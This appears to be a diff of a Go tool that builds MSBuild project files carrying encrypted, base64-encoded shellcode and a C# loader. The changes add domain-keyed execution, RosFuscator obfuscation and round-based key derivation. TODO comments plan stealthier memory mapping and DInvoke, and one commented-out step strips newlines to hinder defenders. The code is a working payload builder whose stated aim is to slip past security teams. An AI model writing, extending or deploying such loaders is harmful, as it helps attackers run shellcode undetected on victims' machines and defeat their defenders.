@@ -4,6 +4,7 @@ import (
 	"bytes"
 	"compress/gzip"
 	"crypto/sha256"
+	"encoding/base64"
 	"flag"
 	"fmt"
 	"io/ioutil"
@@ -14,7 +15,12 @@ import (
 	"time"
 )
 
-var version = "1.4"
+var version = "1.5"
+
+//TODO obfiscation - https://github.com/Flangvik/RosFuscator
+//TODO domain key
+//TODO use NtMapViewOfSection instead of VirtualAlloc
+//TODO make my MSBuild use Dinvoke to be more stealthy
 
 type MSBuildPayload struct {
 	Payload string
@@ -82,14 +88,18 @@ func main() {
 	var scFilename string
 	var codeFilename string
 	var outFilename string
+	var domainKey string
 	var iterations int
 	var encryptOnly bool
+	var obfuscate bool
 
 	flag.StringVar(&scFilename, "shellcode", "shellcode.bin", "Shellcode file to embed inside the MSBuild payload.")
 	flag.StringVar(&codeFilename, "code", "payload.cs", "C# source code filename that the MSBuild payload should execute.")
 	flag.StringVar(&outFilename, "outfile", "", "Output filename for the MSBuild project or encrypted shellcode.")
-	flag.IntVar(&iterations, "iterations", 100000, "The number of iterations the loader will need to perform to reach the correct decryption key.")
+	flag.IntVar(&iterations, "rounds", 57285, "The number of iterations the loader will need to perform to reach the correct decryption key.")
+	flag.StringVar(&domainKey, "key", "", "Key to Domain: the payload will only execute on a specific domain.")
 	flag.BoolVar(&encryptOnly, "encryptOnly", false, "Output only the encrypted shellcode for another tool/project.")
+	flag.BoolVar(&obfuscate, "obfuscate", false, "Obfuscate the c# code using RosFuscator.")
 	flag.Parse()
 
 	if !fileExists(scFilename) {
@@ -179,12 +189,18 @@ func main() {
 			outFilename = "payload" + t.Format("20060102150405") + ".xml"
 		}
 		// msbuild project template
-		fmt.Printf("[+] Creating msbuild profile file... ")
+
 		// insert code into MSBuild template
 		MSBuildTemplate = strings.Replace(MSBuildTemplate, "CODE_GOES_HERE", string(payloadCode), 1)
 
+		//fmt.Printf("[+] Stripping newline characters to make Blue Team's life harder ... ")
+		//MSBuildTemplate = strings.Replace(MSBuildTemplate, "\r\n", "", -1)
+
+		fmt.Println("Done")
+
+		fmt.Printf("[+] Creating msbuild profile file... ")
 		answers := MSBuildPayload{
-			Payload: formatBytes(encShellcode),
+			Payload: base64.StdEncoding.EncodeToString(encShellcode),
 			Hash:    formatBytes(shellcodeHash[:]),
 			Key:     formatBytes(key),
 		}
